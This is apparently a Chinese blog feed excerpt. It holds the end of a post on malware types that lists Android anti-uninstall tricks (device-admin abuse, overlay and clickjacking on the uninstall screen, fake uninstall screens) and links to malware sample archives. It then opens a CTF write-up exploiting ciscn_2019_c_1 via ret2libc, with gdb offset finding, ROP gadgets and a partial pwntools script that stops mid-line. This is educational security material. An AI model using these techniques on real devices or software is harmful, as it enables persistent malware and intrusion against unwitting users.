如果应用注册了设备管理员权限，应用可以通过 onDisabled() 方法接收到设备管理员被禁用的事件， 这通常意味着用户已经卸载了该应用。</p></li><li><p><strong>自定义Service：</strong> 应用可以通过注册一个系统服务，监听系统的包管理变化，如果发现自身被卸载，则执行相应操作。</p></li><li><p><strong>定时任务：</strong> 应用可以通过定时任务来检测自身是否仍然存在，如果发现自身已经被卸载，则执行相应操作。</p></li><li><p><strong>SharedPreference：</strong> 如果应用卸载后又被重新安装，那么SharedPreferences 会被重置。应用可以通过这个来判断自己是不是被卸载后又重新安装的。</p></li><li><p><strong>检查安装目录：</strong> 如果应用程序发现自身的安装目录不存在，则可以判断自己已经被卸载。</p></li><li><p><strong>使用 Native 代码：</strong> 应用程序可以利用Native代码，进行更底层的检测，例如检测系统进程、检测系统文件， 从而判断自己是否被卸载。</p></li><li><p><strong>云端检测：</strong> 应用程序可以通过云端服务器来检测自身是否仍然安装在用户设备上， 如果云端服务器检测到设备上不再存在该应用， 则表明应用已经被卸载。</p></li></ul><h4 id="阻止卸载-1"><a href="#阻止卸载-1" class="headerlink" title="阻止卸载"></a>阻止卸载</h4><ul><li><p><strong>设备管理员权限 (Device Admin)：</strong></p><ul><li><p>恶意软件会诱导用户授予其设备管理员权限，一旦获得该权限，恶意软件可以控制设备的卸载过程。</p></li><li><p>恶意软件可以通过 onDisableRequested() 方法，在用户尝试禁用设备管理员权限时，弹出自定义弹窗，诱导用户不卸载该应用。</p></li><li><p>恶意软件可以通过 onDisabled() 方法，在设备管理员权限被禁用时，执行恶意操作，例如 重复申请权限，重新激活自身， 强制重启等。</p></li></ul></li><li><p><strong>覆盖攻击：</strong> 恶意软件可以使用 SYSTEM_ALERT_WINDOW 权限，在卸载界面上创建一个透明的覆盖层，当用户点击卸载按钮时，实际上是点击了恶意软件的按钮。</p></li><li><p><strong>点击劫持：</strong> 恶意软件可以使用点击劫持，把正常的卸载按钮放在透明层之下， 当用户点击透明层时，实际上点击了正常的卸载按钮。</p></li><li><p><strong>伪造卸载界面：</strong> 恶意软件可以伪造一个卸载界面，看起来像是系统的卸载界面，实际上用户并没有真正卸载恶意软件。</p></li><li><p><strong>阻止卸载按钮：</strong> 恶意软件可以通过各种技术手段，阻止用户点击卸载按钮， 例如通过 AccessibilityService 来阻止点击事件， 或者通过root权限 修改系统文件来实现。</p></li><li><p><strong>设置卸载密码：</strong> 恶意软件可能会设置一个卸载密码，阻止用户直接卸载该应用。</p></li></ul><h3 id="僵尸网络"><a href="#僵尸网络" class="headerlink" title="僵尸网络"></a>僵尸网络</h3><p>由受感染计算机组成的网络，这些计算机在攻击者的控制下执行恶意活动，可以用于发送垃圾邮件、发起DDoS攻击、传播恶意软件等。<br>将其作为肉鸡来挖矿</p><p><strong>僵尸网络示例：</strong></p><ul><li><strong>仙女座恶意软件</strong> – 仙女座僵尸网络与 80 个不同的恶意软件家族相关联。它的范围甚广，一度 每月感染一百万台新机器，通过社交媒体、即时消息、垃圾邮件、漏洞利用工具包等传播自己。该行动在 2017 年被联邦调查局、欧洲刑警组织的欧洲网络犯罪中心等破获，但许多个人电脑继续受到感染。</li><li><strong>Mirai</strong> — 2016年，一场大规模的 DDoS 攻击导致美国东海岸大部分地区无法上网。当局最初担心这次袭击是一个敌对国家干的，后来发现是由 Mirai 僵尸网络引起的。Mirai 是一种自动发现<a class="link"   href="https://www.kaspersky.com.cn/resource-center/threats/internet-of-things-security-risks" >物联网<i class="fas fa-external-link-alt"></i></a> (IoT) 设备感染并将其征入僵尸网络的恶意软件。从那里，这支 IoT 大军可以用来发起 DDoS 攻击，在攻击中，大量的垃圾流量用恶意流量淹没目标服务器。 <a class="link"   href="https://www.techradar.com/news/millions-of-home-routers-could-be-hacked-by-this-simple-bug" >Mirai 今天仍继续制造麻烦<i class="fas fa-external-link-alt"></i></a>。</li></ul><h3 id="数据包嗅探器"><a href="#数据包嗅探器" class="headerlink" title="数据包嗅探器"></a>数据包嗅探器</h3><p><strong>恶意目的：</strong></p><ul><li><p><strong>窃取敏感信息：</strong></p><ul><li><p><strong>账号密码：</strong> 恶意软件可以嗅探网络中的数据包，截获用户输入的账号密码，例如：HTTP协议传输的账号密码。</p></li><li><p><strong>信用卡信息：</strong> 恶意软件可以嗅探网络中的数据包，截获用户输入的信用卡信息。</p></li><li><p><strong>聊天记录：</strong> 恶意软件可以嗅探网络中的数据包，截获用户的聊天记录，例如：IM协议传输的聊天记录。</p></li><li><p><strong>电子邮件：</strong> 恶意软件可以嗅探网络中的数据包，截获用户的电子邮件内容。</p></li><li><p><strong>其他敏感信息：</strong> 恶意软件可以嗅探网络中的数据包，截获其他敏感信息， 例如： 银行信息， 个人身份信息等。</p></li></ul></li><li><p><strong>中间人攻击（Man-in-the-Middle Attack）：</strong></p><ul><li><p><strong>流量劫持：</strong> 攻击者可以利用数据包嗅探器，劫持用户的网络流量，例如：将用户重定向到恶意网站。</p></li><li><p><strong>数据篡改：</strong> 攻击者可以利用数据包嗅探器，拦截和修改网络中的数据包，从而篡改用户的网页内容或数据传输。</p></li><li><p><strong>注入恶意代码：</strong> 攻击者可以利用数据包嗅探器，在网络数据包中注入恶意代码。</p></li></ul></li><li><p><strong>网络侦察（Network Reconnaissance）：</strong></p><ul><li><p><strong>扫描网络：</strong> 攻击者可以利用数据包嗅探器，扫描网络中的设备和开放端口，从而了解网络的拓扑结构和设备信息。</p></li><li><p><strong>识别漏洞：</strong> 攻击者可以利用数据包嗅探器，识别网络中的漏洞，例如：未加密的协议、过时的协议等。</p></li><li><p><strong>分析网络流量：</strong> 攻击者可以利用数据包嗅探器，分析网络流量的模式，从而了解用户的上网习惯和喜好。</p></li></ul></li><li><p><strong>拒绝服务攻击（Denial-of-Service Attack）：</strong></p><ul><li><p><strong>大量数据包攻击：</strong> 攻击者可以利用数据包嗅探器，发送大量的数据包，耗尽目标服务器的网络带宽和处理能力，从而导致服务瘫痪。</p></li><li><p><strong>恶意数据包：</strong> 攻击者可以利用数据包嗅探器，构造恶意的数据包，发送到目标服务器，从而导致服务崩溃。</p></li></ul></li><li><p><strong>协议分析：</strong></p><ul><li>攻击者可以通过数据包嗅探器来分析某些不常见的网络协议，从而了解其工作原理， 挖掘漏洞。</li></ul></li><li><p><strong>其他恶意目的：</strong></p><ul><li><p><strong>DDoS攻击：</strong> 利用被控制的设备发动DDoS攻击。</p></li><li><p><strong>植入后门：</strong> 利用嗅探到的信息来植入后门。</p></li><li><p><strong>网络钓鱼：</strong> 利用嗅探到的信息进行网络钓鱼攻击。</p></li></ul></li></ul><h3 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h3><p><strong>木马示例：</strong></p><ul><li><strong>Qbot 恶意软件</strong>也被称为 Qakbot 或Pinkslipbot，是自 2007 年以来活跃的银行木马，专注于窃取用户数据和银行凭证。恶意软件已经演化到包括新的传递机制、命令和控制技术以及反分析功能。</li><li><strong>TrickBot 恶意软件</strong>于 2016 年首次确定，是由老练的网络犯罪分子开发和操作的特洛伊木马。TrickBot 最初设计作为银行木马以窃取财务数据，现已演化成为模块化的多阶段恶意软件，为其操作者提供执行众多非法网络活动的全套工具。</li></ul><h3 id="蠕虫"><a href="#蠕虫" class="headerlink" title="蠕虫"></a>蠕虫</h3><p>特点是可以自行复制<br><strong>蠕虫示例：</strong></p><ul><li><strong>SQL Slammer</strong> 是一个知名的计算机蠕虫，不使用传统的分发方法。相反，它产生随机的 <a class="link"   href="https://www.kaspersky.com.cn/resource-center/definitions/what-is-an-ip-address" >IP 地址<i class="fas fa-external-link-alt"></i></a>并将自己发送给他们，寻找那些不受防病毒软件保护的人。它在 2003 年面世后不久，超过 75,000 台受感染的计算机在几个主要网站上不知不觉参与了 <a class="link"   href="https://www.kaspersky.com.cn/resource-center/threats/ddos-attacks" >DDoS 攻击<i class="fas fa-external-link-alt"></i></a>。尽管相关安全补丁已经提供了多年，但 SQL Slammer在 2016 年和 2017 年仍然死灰复燃。</li></ul><h3 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h3><p>病毒是一段代码，将自身插入应用程序并在应用程序运行时执行。一旦进入网络，病毒就可能被用来窃取敏感数据、发动 DDoS 攻击或进行勒索软件攻击。病毒通常通过受感染的网站、文件共享或电子邮件附件下载传播，在受感染的主机文件或程序被激活前处于休眠状态。一旦发生这种情况，病毒就可以自我复制并通过您的系统传播。<br><strong>病毒示例：</strong></p><ul><li><strong>Stuxnet</strong>— Stuxnet出现在 2010 年，被广泛认为由美国和以色列政府开发，用来破坏伊朗的核计划。它通过 USB 驱动传播，针对西门子工业控制系统，导致离心机以创纪录的速度发生故障和自毁。据信 Stuxnet 感染了 20,000 多台计算机，摧毁了伊朗五分之一的核离心机，这使其计划退回到几年前。</li></ul><h3 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h3><h4 id="无文件恶意软件"><a href="#无文件恶意软件" class="headerlink" title="无文件恶意软件"></a>无文件恶意软件</h4><p>无文件恶意软件是一种使用合法程序感染计算机的恶意软件。它不依赖文件，也不留下足迹，这使得检测和删除富有挑战性。无文件恶意软件在 2017 年作为一种主流攻击类型出现，但其中许多攻击方法已经存在了一段时间。</p><p>无文件感染不存储在文件中或直接安装在机器上，会直接进入内存，恶意内容永远不会触及硬盘驱动器。网络犯罪分子越来越多地将无文件恶意软件作为一种有效的替代攻击形式，这使得传统防病毒软件更难以检测到它，因为它占用空间小，没有要扫描的文件。</p><p><strong>无文件恶意软件示例：</strong></p><ul><li>Frodo、Number Of The Beast 和 The Dark Avenger 都是这种恶意软件的早期例子。</li></ul><h4 id="逻辑炸弹"><a href="#逻辑炸弹" class="headerlink" title="逻辑炸弹"></a>逻辑炸弹</h4><p>逻辑炸弹是一种恶意软件，只有在触发时才会激活，例如在特定日期和时间或第 20 次登录帐户。病毒和蠕虫通常包含逻辑炸弹，以便在预先定义的时间或满足其他条件时传递其有效载荷（即恶意代码）。逻辑炸弹造成的损害从改变几个字节的数据到使硬盘驱动器无法读取，不一而足。</p><p><strong>逻辑炸弹示例：</strong></p><ul><li>2016 年，一位程序员 <a class="link"   href="https://www.businessinsider.com/logic-bomb-siemens-spreadsheet-contract-programmer-2019-7" >导致电子表格每隔几年在西门子公司的一个分支机构出现故障<i class="fas fa-external-link-alt"></i></a>，所以他们只好不断雇用他来解决这个问题。在这种情况下，没有人怀疑任何事情，直到一次巧合迫使恶意代码公之于众。</li></ul><h4 id="混合恶意软件"><a href="#混合恶意软件" class="headerlink" title="混合恶意软件"></a>混合恶意软件</h4><p>今天，大多数恶意软件是不同类型的恶意软件的组合，通常包括部分特洛伊木马和蠕虫，偶尔还包括病毒。通常，恶意软件程序在最终用户看来是特洛伊木马，但一旦执行，它就会像蠕虫一样通过网络攻击其他受害者。</p><p><strong>混合恶意软件示例：</strong></p><ul><li>2001 年，一位自称为”Lion”的恶意软件开发者发布了一种混合恶意软件：蠕虫&#x2F;rootkit组合。<a class="link"   href="https://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkit" >Rootkits<i class="fas fa-external-link-alt"></i></a>允许黑客操纵操作系统文件，而蠕虫是快速传播代码段的强大载体。这种恶意组合造成了严重破坏：它对 10,000 多个Linux 系统造成了损害。蠕虫&#x2F;rootkit 组合恶意软件被明确设计为利用 Linux 系统中的漏洞。</li><li>Dridex:该恶意软件的目标是 Windows 用户，他们在 Word 或 Excel 中打开电子邮件附件 ，导致宏激活和下载 Dridex，感染计算机并使受害者面临银行盗窃。该软件的主要目标是从受感染机器的用户那里窃取银行信息,以立即启动欺诈交易。软件的 Bank 信息会安装键盘侦听器并执行注入攻击。</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.kaspersky.com.cn/resource-center/definitions/what-is-ransomware-as-a-service" >https://www.kaspersky.com.cn/resource-center/definitions/what-is-ransomware-as-a-service<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://www.kaspersky.com.cn/resource-center/threats/types-of-malware" >https://www.kaspersky.com.cn/resource-center/threats/types-of-malware<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkit" >https://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkit<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://source.android.com/docs/core/permissions?hl=zh-cn" >https://source.android.com/docs/core/permissions?hl=zh-cn<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://bible.malcore.io/readme/the-beginning/introduction-to-malware" >https://bible.malcore.io/readme/the-beginning/introduction-to-malware<i class="fas fa-external-link-alt"></i></a><br>ek:<a class="link"   href="https://unit42.paloaltonetworks.com/unit42-understanding-angler-exploit-kit-part-1-exploit-kit-fundamentals/" >https://unit42.paloaltonetworks.com/unit42-understanding-angler-exploit-kit-part-1-exploit-kit-fundamentals/<i class="fas fa-external-link-alt"></i></a><br>路过式下载:<a class="link"   href="https://www.51cto.com/article/317226.html" >https://www.51cto.com/article/317226.html<i class="fas fa-external-link-alt"></i></a><br>广告联盟:<a class="link"   href="https://u.oppomobile.com/home/_book/%E5%90%88%E4%BD%9C%E6%B3%A8%E5%86%8C/%E5%90%88%E4%BD%9C%E6%B5%81%E7%A8%8B.html" >https://u.oppomobile.com/home/_book/%E5%90%88%E4%BD%9C%E6%B3%A8%E5%86%8C/%E5%90%88%E4%BD%9C%E6%B5%81%E7%A8%8B.html<i class="fas fa-external-link-alt"></i></a><br>资源社区推荐，下载附件时请注意，它们可能会造成不可控的伤害<br><a class="link"   href="https://github.com/ytisf/thezoo" >https://github.com/ytisf/thezoo<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://virusshare.com/" >https://virusshare.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://malwaretech.com/" >https://malwaretech.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://virus.exchange/samples" >https://virus.exchange/samples<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://vx-underground.org/" >https://vx-underground.org/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://reverseengineering.meta.stackexchange.com/" >https://reverseengineering.meta.stackexchange.com/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;目的是做一个恶意软件，实现基本恶意功能，当前版本专注于实现基本功能，只有基本界面和功能。那么一个恶意软件应当具有什么功能呢，下面主要研究的是</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>从ciscn_2019_c_1看ret2libc</title>
    <link href="http://arch3rn4r.github.io/2024/09/26/%E4%BB%8Eciscn-2019-c-1%E7%9C%8Bret2libc/"/>
    <id>http://arch3rn4r.github.io/2024/09/26/%E4%BB%8Eciscn-2019-c-1%E7%9C%8Bret2libc/</id>
    <published>2024-09-26T06:25:00.000Z</published>
    <updated>2025-05-02T02:41:59.179Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置分析"><a href="#前置分析" class="headerlink" title="前置分析"></a>前置分析</h2><p>检查保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec <span class="string">&#x27;/home/pwn/ciscn_2019_c_1&#x27;</span> </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/ciscn_2019_c_1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>主函数</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/Aspose.Words.b29023ea-ea4d-4a54-8e76-4a1beff23b1c.001.70ab0trg2l.webp"                                        ></p><p>关键函数，里面有个数组s,然后还有一些过滤和判断，这里是对字符进行分类然后异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x60</span> &lt; c &lt;= <span class="number">0x7a</span>:  <span class="comment"># 26个小写英文字母</span></span><br><span class="line">        c = c^<span class="number">0xD</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x40</span> &lt; c &lt;= <span class="number">0x5a</span>:  <span class="comment"># 26个大写英文字母</span></span><br><span class="line">        c = c^<span class="number">0xE</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x2f</span> &lt; c &lt;= <span class="number">0x39</span>:  <span class="comment"># 0-9</span></span><br><span class="line">        c = c^<span class="number">0xF</span></span><br><span class="line">    <span class="comment"># 非数字和英文字母不做处理</span></span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/Aspose.Words.b29023ea-ea4d-4a54-8e76-4a1beff23b1c.002.64dtldhu59.webp"                                        ></p><p>存在gets函数且没有检查输入，则有机会利用函数进行溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure><h2 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h2><h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>首先需要造成溢出，才能去执行构造好的payload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">__int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure><p>溢出点在gets（s）,所以先要填充0x50+0x8&#x3D;0x58,0x8是函数返回地址</p><p>也可以选择自己计算出溢出量</p><blockquote><p>在pwntools库中，<code>cyclic</code>函数用于生成一个特定的字符串，这个字符串包含了重复的、可预测的模式，这样在缓冲区溢出时可以更容易地找到偏移量。<code>cyclic_find</code>函数则用于在给定的输入中找到特定模式的偏移量。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用pwntool生成循环字符</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(cyclic(<span class="number">128</span>))</span><br><span class="line"><span class="comment"># b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#x27;</span></span><br></pre></td></tr></table></figure><p>使用gdb进行调试</p><p>首先运行程序，发送cyclic字符（aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab）</p><p>出现段错误后获取出现错误的地址，<code>0x400aee</code>,查看程序视图也可以得出0x400aee是encrypt函数的返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$  <span class="string">&#x27;/home/pwn/桌面/ciscn_2019_c_1&#x27;</span>                                                                                                                    </span><br><span class="line">EEEEEEE                            hh      iii                </span><br><span class="line">EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  </span><br><span class="line">EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e </span><br><span class="line">EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  </span><br><span class="line">EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee </span><br><span class="line">====================================================================</span><br><span class="line">Welcome to this Encryption machine</span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line"><span class="number">1.</span>Encrypt</span><br><span class="line"><span class="number">2.</span>Decrypt</span><br><span class="line"><span class="number">3.</span>Exit</span><br><span class="line">Input your choice!</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Input your Plaintext to be encrypted</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab</span><br><span class="line">Ciphertext</span><br><span class="line">llllolllnlllilllhlllkllljlllellldlllglllflllalll`lllclllblll&#125;lll|llllll~lllylllxlll&#123;lllzlllullltlllwlloollonlloillohllokllojllo</span><br><span class="line">段错误</span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$ dmesg |tail -n1                                                                                                                                                        </span><br><span class="line">[ <span class="number">3660.583627</span>] traps: ciscn_2019_c_1[<span class="number">30910</span>] general protection fault ip:400aee sp:7fffc2f5aab8 error:<span class="number">0</span> <span class="keyword">in</span> ciscn_2019_c_1[<span class="number">400000</span>+<span class="number">2000</span>]</span><br></pre></td></tr></table></figure><p>使用gdb,按照上面的流程运行程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ gdb ./ciscn_2019_c_1  </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; x/gx $rsp</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="number">0x6c6c6c756c6c6c7a</span></span><br><span class="line">pwndbg&gt; x/s $rsp</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="string">&quot;zlllullltlllwlloollonlloillohllokllojllo&quot;</span></span><br></pre></td></tr></table></figure><p>然后开始处理得到的数据zlllullltlllwlloollonlloillohllokllojllo，最终计算得出偏移大小为88，也就是0x58</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进行异或，因为encrypt函数会对输入的小写字母进行^0xD</span></span><br><span class="line">original_string = <span class="string">&quot;zlllullltlllwlloollonlloillohllokllojllo&quot;</span>  <span class="comment">#这串字符将在gdb调试中获得</span></span><br><span class="line">xor_value = <span class="number">0xD</span></span><br><span class="line">first_xor = xor_string(original_string, xor_value)</span><br><span class="line"><span class="built_in">print</span>(first_xor)</span><br><span class="line"><span class="comment">#waaa</span></span><br><span class="line"><span class="built_in">print</span>(cyclic_find(<span class="string">&#x27;waaa&#x27;</span>))</span><br><span class="line"><span class="comment">#88</span></span><br></pre></td></tr></table></figure><h3 id="ret2libc和ROP"><a href="#ret2libc和ROP" class="headerlink" title="ret2libc和ROP"></a>ret2libc和ROP</h3><p><strong>怎么利用？</strong></p><p>在前面的分析中，可以得知，这些函数本身并不存在后门函数，既system()，”&#x2F;bin&#x2F;sh“，execve（）之类,在这种情况下怎么利用呢？当然是跳出原文件限制，转而去利用原文件运行时链接的libc库，通过泄露libc地址来调用system或execve函数。</p><p><strong>ret2libc</strong> 是一种<strong>绕过栈不可执行（NX bit）保护的攻击技术</strong>，主要用于通过标准 C 库（libc）<strong>中的函数，</strong><code>libc.so.6</code>** 是 Linux 系统中的标准 C 库，包含了许多常见的函数。<strong>在 ret2libc 中</strong>，攻击者需要找到 <code>libc</code> 中 <code>system()</code> 函数和 <code>/bin/sh</code> 的地址。攻击者构造的 payload 将会覆盖返回地址为 <code>system()</code> 函数，且栈上紧跟着的参数为 <code>/bin/sh</code>。</p><p><strong>ROP</strong> 是 ret2libc 的进阶形式，主要用于针对更高级别的安全措施，例如地址空间布局随机化（ASLR）。ROP 的核心思想是通过寻找程序中的 短指令序列（<strong>ROP gadget</strong>)，将它们组合起来构成可执行的指令链，从而达到执行恶意代码的目的。就像搭积木一样，找到合适的指令，然后重新组装，利用原有的指令来运行攻击代码。</p><p>在ROP攻击中，每个函数调用（包括ROP gadget）都需要有一个<strong>返回地址</strong>。这是因为在正常的程序执行过程中，<em>函数执行完后会通过栈上的返回地址回到调用它的地方</em>。因此，你的payload必须指定每个函数或gadget执行完后跳转的地址。例如，第一次调用<code>puts</code>时，必须有返回地址<code>main_addr</code>以保证程序不崩溃，而第二次攻击中，<code>system(&quot;/bin/sh&quot;)</code>之后实际上不需要返回，但程序仍然会执行最后的返回操作。</p><p>使用ROPgadget查找 <em>gadgets</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_c_1 --only <span class="string">&#x27;pop|ret&#x27;</span>                                                             </span><br><span class="line">Gadgets information                                                                                                </span><br><span class="line">============================================================                                                       </span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret                                                   </span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret                                                             </span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret                                                                       </span><br><span class="line">0x0000000000400c82 : pop r15 ; ret                                                                                 </span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret                                         </span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret                                                             </span><br><span class="line">0x00000000004007f0 : pop rbp ; ret                                                                                 </span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret                                                                       </span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br></pre></td></tr></table></figure><p>可用的gadget<code>0x0000000000400c83 : pop rdi ; ret</code></p><p><strong>如何找到呢？</strong></p><p>libc库的内容是动态装载到进程空间的，里边的函数和变量的地址只能在运行时定位。下面是找到具体地址的步骤。</p><h4 id="1-寻找libc库基址"><a href="#1-寻找libc库基址" class="headerlink" title="1.寻找libc库基址"></a>1.寻找libc库基址</h4><p>这里使用利用puts（）函数来泄露libc基址（也不一定要用puts,用gets也行，这一步是为了计算出libc基址）</p><p><strong>方法1——使用python代码自动获取 （推荐）</strong></p><blockquote><p>由于 ELF 文件的程序在编译时并不知道动态链接库中的函数地址，因此它使用 GOT 和 PLT 来进行延迟绑定（lazy binding）。第一次调用时，PLT 会解决函数地址并存储在 GOT 中，之后所有对该函数的调用都直接从 GOT 中取地址。</p></blockquote><p>GOT 表中存储的 <code>puts</code> 地址是程序运行时实际使用的 <code>puts</code> 函数地址，而这个地址位于 <strong>libc</strong> 中。一旦我们通过 <code>puts</code> 函数输出了 GOT 表中 <code>puts</code> 的实际地址，我们就可以根据已知的 <code>puts</code> 在 libc 中的偏移量，计算出整个 libc 的基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>) </span><br><span class="line">main_addr = <span class="number">0x400B28</span> </span><br><span class="line">pop_rdi = <span class="number">0x400C83</span>  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]   <span class="comment">#puts 